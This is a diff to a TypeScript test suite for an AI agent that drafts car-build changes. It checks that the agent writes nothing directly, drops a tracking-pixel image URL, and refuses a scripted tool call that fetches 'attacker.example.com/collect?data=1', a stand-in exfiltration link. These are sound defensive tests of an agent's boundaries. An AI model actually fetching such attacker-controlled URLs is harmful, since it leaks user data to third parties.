@@ -7,7 +7,7 @@ import { memberContext, modelContext } from "@/lib/agent/context";
 import { negotiate, type NegotiationInput } from "@/lib/agent/negotiate";
 import { resolveAiConfig } from "@/lib/ai/config";
 import { redactForModel, redactForStorage } from "@/lib/ai/redact";
-import { agentSystemPrompt, runAgentTurn } from "@/lib/ai/run";
+import { agentSystemPrompt, linkInMessage, runAgentTurn } from "@/lib/ai/run";
 import { openLedger, type SpendLedger } from "@/lib/ai/spend";
 import { wrapUntrusted, type UntrustedSource } from "@/lib/ai/untrusted";
 import { MODEL_MAX_RISK, modelToolsFor } from "@/lib/capabilities/registry";
@@ -189,6 +189,86 @@ describe("eval fixtures: the model's boundary", () => {
       expect(prompt).toMatch(/never choose a price/);
       expect(prompt).toMatch(/untrusted_data/);
       expect(prompt).not.toMatch(/\d{3,}/);
+    }
+  });
+});
+
+const CAR = { id: "33333333-3333-4333-8333-333333333333", name: "Mk8 Golf R" };
+const OLD_MOD = { id: "44444444-4444-4444-8444-444444444444", brand: "APR", product: "Roll-Control mount", status: "installed" };
+
+/** A member client for one car and its build that records any write it's asked for. */
+function garageSupabase() {
+  const writes: string[] = [];
+  const answer = (table: string) => (table === "cars" ? CAR : table === "mod_items" ? OLD_MOD : null);
+  const client = {
+    from(table: string) {
+      const query = {
+        select: () => query,
+        eq: () => query,
+        order: () => query,
+        limit: () => Promise.resolve({ data: [answer(table)], error: null }),
+        maybeSingle: () => Promise.resolve({ data: answer(table), error: null }),
+        insert: () => { writes.push(`insert:${table}`); return query; },
+        update: () => { writes.push(`update:${table}`); return query; },
+        upsert: () => { writes.push(`upsert:${table}`); return query; },
+        delete: () => { writes.push(`delete:${table}`); return query; },
+      };
+      return query;
+    },
+    rpc(name: string) { writes.push(`rpc:${name}`); return Promise.resolve({ data: null, error: null }); },
+  };
+  return { supabase: client as unknown as MemberClient, writes };
+}
+
+describe("eval fixtures: Update my build (A3c)", () => {
+  const config = { ...resolveAiConfig({ NODE_ENV: "test", ANTHROPIC_API_KEY: "test" }), mode: "anthropic" as const };
+  const member = "22222222-2222-4222-8222-222222222222";
+
+  it("drafts a build change as a card and writes nothing", async () => {
+    const { supabase, writes } = garageSupabase();
+    const { client } = scriptedClient([
+      { tool: "propose_build_change", input: { carId: CAR.id, brand: "KW", product: "V3 coilovers", category: "suspension", replacesModId: OLD_MOD.id } },
+    ]);
+    const result = await runAgentTurn({ context: modelContext(member, "buyer"), supabase, message: "Just fitted KW V3s in place of the APR mount", client, config, spend: openLedger });
+    expect(result.ok).toBe(true);
+    expect(writes).toEqual([]);
+    expect(result.ok && result.cards).toEqual([
+      expect.objectContaining({ kind: "build_change", car: CAR.id, replaces: OLD_MOD.id, brand: "KW", product: "V3 coilovers", category: "suspension" }),
+    ]);
+    // The draft names no money: a build change never carries a price.
+    expect(JSON.stringify(result.ok && result.cards)).not.toMatch(/price|cents/);
+  });
+
+  it("won't keep a thumbnail that isn't the member's own upload", async () => {
+    const { supabase } = garageSupabase();
+    const { client } = scriptedClient([
+      { tool: "propose_build_change", input: { carId: CAR.id, product: "V3 coilovers", imageUrl: "https://tracker.example.com/pixel.gif" } },
+    ]);
+    const result = await runAgentTurn({ context: modelContext(member, "garage"), supabase, message: "add KW V3s", client, config, spend: openLedger });
+    expect(result.ok && result.cards[0]).toMatchObject({ kind: "build_change", image_url: null });
+  });
+
+  it("reads a product page only when the member pasted that link this turn", async () => {
+    const { supabase } = garageSupabase();
+    const { client, seen } = scriptedClient([{ tool: "read_part_link", input: { url: "https://attacker.example.com/collect?data=1" } }]);
+    const result = await runAgentTurn({ context: modelContext(member, "buyer"), supabase, message: "I fitted these: https://shop.example.com/kw-v3", client, config, spend: openLedger });
+    expect(result.toolCalls).toEqual([{ name: "read_part_link", ok: false, code: "not_allowed" }]);
+    expect(seen.toolResults[0]).toContain("not_allowed");
+  });
+
+  it("matches a pasted link by host and path, not by any text", () => {
+    expect(linkInMessage("https://shop.example.com/kw-v3", "fitted https://www.shop.example.com/kw-v3/ today")).toBe(true);
+    expect(linkInMessage("https://shop.example.com/kw-v3?ref=x", "see https://shop.example.com/kw-v3.")).toBe(true);
+    expect(linkInMessage("https://shop.example.com/other", "see https://shop.example.com/kw-v3")).toBe(false);
+    expect(linkInMessage("https://evil.example.com/kw-v3", "shop.example.com/kw-v3 and evil.example.com")).toBe(false);
+    expect(linkInMessage(42, "https://shop.example.com")).toBe(false);
+  });
+
+  it("the build tools are drafts at most, and only buyer and garage get them", () => {
+    for (const name of ["read_part_link", "propose_build_change"]) {
+      expect(modelToolsFor("buyer").map((tool) => tool.name)).toContain(name);
+      expect(modelToolsFor("garage").map((tool) => tool.name)).toContain(name);
+      expect(modelToolsFor("seller").map((tool) => tool.name)).not.toContain(name);
     }
   });
 });
